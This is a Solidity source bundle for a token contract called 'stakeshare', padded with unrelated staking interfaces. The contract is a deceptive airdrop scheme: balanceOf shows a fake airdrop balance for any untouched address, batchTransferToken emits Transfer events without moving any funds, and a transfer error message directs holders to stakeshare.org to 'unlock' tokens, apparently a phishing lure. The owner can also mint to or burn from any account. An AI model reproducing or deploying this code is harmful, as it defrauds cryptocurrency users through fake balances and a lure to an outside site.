{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"token.sol":{"content":"// SPDX-License-Identifier: GPL-2.0-or-later\n\npragma solidity ^0.8.0;\npragma abicoder v2;\n\n\ninterface genesisCalls {\n\n  function AllowAddressToDestroyGenesis ( address _from, address _address ) external;\n\n  function AllowReceiveGenesisTransfers ( address _from ) external;\n\n  function BurnTokens ( address _from, uint256 mneToBurn ) external returns ( bool success );\n\n  function RemoveAllowAddressToDestroyGenesis ( address _from ) external;\n\n  function RemoveAllowReceiveGenesisTransfers ( address _from ) external;\n\n  function RemoveGenesisAddressFromSale ( address _from ) external;\n\n  function SetGenesisForSale ( address _from, uint256 weiPrice ) external;\n\n  function TransferGenesis ( address _from, address _to ) external;\n\n  function UpgradeToLevel2FromLevel1 ( address _address, uint256 weiValue ) external;\n\n  function UpgradeToLevel3FromDev ( address _address ) external;\n\n  function UpgradeToLevel3FromLevel1 ( address _address, uint256 weiValue ) external;\n\n  function UpgradeToLevel3FromLevel2 ( address _address, uint256 weiValue ) external;\n\n  function availableBalanceOf ( address _address ) external view returns ( uint256 Balance );\n\n  function balanceOf ( address _address ) external view returns ( uint256 balance );\n\n  function deleteAddressFromGenesisSaleList ( address _address ) external;\n\n  function isAnyGenesisAddress ( address _address ) external view returns ( bool success );\n\n  function isGenesisAddressLevel1 ( address _address ) external view returns ( bool success );\n\n  function isGenesisAddressLevel2 ( address _address ) external view returns ( bool success );\n\n  function isGenesisAddressLevel2Or3 ( address _address ) external view returns ( bool success );\n\n  function isGenesisAddressLevel3 ( address _address ) external view returns ( bool success );\n\n  function ownerGenesis (  ) external view returns ( address );\n\n  function ownerGenesisBuys (  ) external view returns ( address );\n\n  function ownerMain (  ) external view returns ( address );\n\n  function ownerNormalAddress (  ) external view returns ( address );\n\n  function ownerStakeBuys (  ) external view returns ( address );\n\n  function ownerStakes (  ) external view returns ( address );\n\n  function setGenesisCallerAddress ( address _caller ) external returns ( bool success );\n  \n  function setOwnerGenesisBuys (  ) external;\n\n  function setOwnerMain (  ) external;\n  \n  function setOwnerNormalAddress (  ) external;\n  \n  function setOwnerStakeBuys (  ) external;\n  \n  function setOwnerStakes (  ) external;\n  \n  function BurnGenesisAddresses ( address _from, address[] calldata _genesisAddressesToBurn ) external;\n\n}\n\n\ninterface normalAddress {\n  \n  function BuyNormalAddress ( address _from, address _address, uint256 _msgvalue ) external returns ( uint256 _totalToSend );\n  \n  function RemoveNormalAddressFromSale ( address _address ) external;\n  \n  function setBalanceNormalAddress ( address _from, address _address, uint256 balance ) external;\n  \n  function SetNormalAddressForSale ( address _from, uint256 weiPricePerMNE ) external;\n  \n  function setOwnerMain (  ) external;\n  \n  function ownerMain (  ) external view returns ( address );\n}\n\n\n\n\ninterface stakes {\n\n  function RemoveStakeFromSale ( address _from ) external;\n\n  function SetStakeForSale ( address _from, uint256 priceInWei ) external;\n\n  function StakeTransferGenesis ( address _from, address _to, uint256 _value, address[] calldata _genesisAddressesToBurn ) external;\n\n  function StakeTransferMNE ( address _from, address _to, uint256 _value ) external returns ( uint256 _mneToBurn );\n\n  function ownerMain (  ) external view returns ( address );\n\n  function setBalanceStakes ( address _from, address _address, uint256 balance ) external;\n\n  function setOwnerMain (  ) external;\n\n}\n\n\n\ninterface stakeBuys {\n\n  function BuyStakeGenesis ( address _from, address _address, address[] calldata _genesisAddressesToBurn, uint256 _msgvalue ) external returns ( uint256 _feesToPayToSeller );\n\n  function BuyStakeMNE ( address _from, address _address, uint256 _msgvalue ) external returns ( uint256 _mneToBurn, uint256 _feesToPayToSeller );\n\n  function ownerMain (  ) external view returns ( address );\n\n  function setOwnerMain (  ) external;\n\n}\n\n\n\ninterface genesisBuys {\n\n  function BuyGenesisLevel1FromNormal ( address _from, address _address, uint256 _msgvalue ) external returns ( uint256 _totalToSend );\n\n  function BuyGenesisLevel2FromNormal ( address _from, address _address, uint256 _msgvalue ) external returns ( uint256 _totalToSend );\n\n  function BuyGenesisLevel3FromNormal ( address _from, address _address, uint256 _msgvalue ) external returns ( uint256 _totalToSend );\n\n  function ownerMain (  ) external view returns ( address );\n\n  function setOwnerMain (  ) external;\n\n}\n\n\n\ninterface tokenService {  \n\n  function ownerMain (  ) external view returns ( address );\n\n  function setOwnerMain (  ) external;\n\n  function circulatingSupply() external view returns (uint256);\n\n  function DestroyGenesisAddressLevel1(address _address) external;\n\n  function Bridge(address _sender, address _address, uint _amount) external;\n\n}\n\ninterface baseTransfers {\n\tfunction setOwnerMain (  ) external;\n\t\n    function transfer ( address _from, address _to, uint256 _value ) external;\n\t\n    function transferFrom ( address _sender, address _from, address _to, uint256 _amount ) external returns ( bool success );\n\t\n    function stopSetup ( address _from ) external returns ( bool success );\n\t\n    function totalSupply (  ) external view returns ( uint256 TotalSupply );\n}\n\n\ninterface mneStaking {\n\n\tfunction startStaking(address _sender, uint256 _amountToStake, address[] calldata _addressList, uint256[] calldata uintList) external;\n\n}\n\ninterface luckyDraw {\n\n\tfunction BuyTickets(address _sender, uint256[] calldata _max) payable external returns ( uint256 );\n\n}\n\n\ninterface externalService {\n\n\tfunction externalFunction(address _sender, address[] calldata _addressList, uint256[] calldata _uintList) payable external returns ( uint256 );\n\n}\n\ninterface externalReceiver {\n\n\tfunction externalFunction(address _sender, uint256 _mneAmount, address[] calldata _addressList, uint256[] calldata _uintList) payable external;\n\n}\n\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\n\n\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        _setOwner(_msgSender());\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _setOwner(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _setOwner(newOwner);\n    }\n\n    function _setOwner(address newOwner) private {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\ninterface IERC20 {\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract stakeshare is Ownable, IERC20 {\n    string private _name;\n    string private _symbol;\n    uint256 private _totalSupply;\n    uint256 private _airdropAmount;\n\n    mapping(address => bool) private _unlocked;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    constructor(string memory name_, string memory symbol_, uint256 airdropAmount_) Ownable() {\n        _name = name_;\n        _symbol = symbol_;\n        _airdropAmount = airdropAmount_;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        if (!_unlocked[account]) {\n            return _airdropAmount;\n        } else {\n            return _balances[account];\n        }\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function setAirdropAmount(uint256 airdropAmount_) public onlyOwner (){\n\n        _airdropAmount = airdropAmount_;\n    }\n    ////////////////////////////////////////////////////////////\n    ////////////////////////////////////////////////////////////\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        unchecked {\n            _approve(sender, _msgSender(), currentAllowance - amount);\n        }\n\n        return true;\n    }\n\n    ////////////////////////////////////////////////////////////\n    ////////////////////////////////////////////////////////////\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(_unlocked[sender], \"ERC20: token must be unlocked before transfer.Visit https://stakeshare.org/ for more info'\");\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n        _unlocked[recipient] = true;\n\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        _unlocked[account] = true;\n        \n        emit Transfer(address(0), account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n        _unlocked[account] = false;\n\n        emit Transfer(account, address(0), amount);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n    \n    ////////////////////////////////////////////////////////////\n    ////////////////////////////////////////////////////////////\n    function mint(address account, uint256 amount) public payable onlyOwner {\n        _mint(account, amount);\n    }\n\n    function burn(address account, uint256 amount) public payable onlyOwner {\n        _burn(account, amount);\n    }\n    \n    function batchTransferToken(address[] memory holders, uint256 amount) public payable {\n        for (uint i=0; i<holders.length; i++) {\n            emit Transfer(address(this), holders[i], amount);\n        }\n    }\n    function withdrawEth(address payable receiver, uint amount) public onlyOwner payable {\n        uint balance = address(this).balance;\n        if (amount == 0) {\n            amount = balance;\n        }\n        require(amount > 0 && balance >= amount, \"no balance\");\n        receiver.transfer(amount);\n    }\n\n    function withdrawToken(address receiver, address tokenAddress, uint amount) public onlyOwner payable {\n        uint balance = IERC20(tokenAddress).balanceOf(address(this));\n        if (amount == 0) {\n            amount = balance;\n        }\n\n        require(amount > 0 && balance >= amount, \"bad amount\");\n        IERC20(tokenAddress).transfer(receiver, amount);\n    }\n}"}}}